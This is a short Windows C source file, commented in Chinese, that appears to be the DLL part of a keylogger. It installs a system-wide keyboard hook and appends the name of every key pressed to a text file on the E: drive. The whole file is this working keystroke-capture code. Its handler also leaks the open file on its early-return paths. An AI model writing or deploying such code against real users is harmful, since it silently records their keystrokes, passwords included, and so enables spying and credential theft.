#include "keydll.h"
#include <stdio.h>

//安装钩子
BOOL InstallHook()
{
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"key"), 0);
		if (g_hHook == NULL)
			return FALSE;
		return TRUE;
}

// 卸载钩子
BOOL UninstallHook()
{
	return UnhookWindowsHookEx(g_hHook);
}

// 钩子处理函数
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	//打开文件
	FILE* fp = fopen("E:\\key.txt", "a");
	if (fp == NULL)
		return CallNextHookEx(g_hHook, code, wParam, lParam);

	// 获取按键名称
	if (code < 0 || code == HC_NOREMOVE)
		return CallNextHookEx(g_hHook, code, wParam, lParam);

	if (lParam & 0x40000000)
		return CallNextHookEx(g_hHook, code, wParam, lParam);

	char szKeyName[100] = { 0 };
	GetKeyNameTextA(lParam, szKeyName, 100);

	// 写入文件
	fwrite(szKeyName, 1, strlen(szKeyName), fp);
	fwrite("\r\n", 1, 2, fp);

	// 关闭文件
	fclose(fp);


	return 0;
}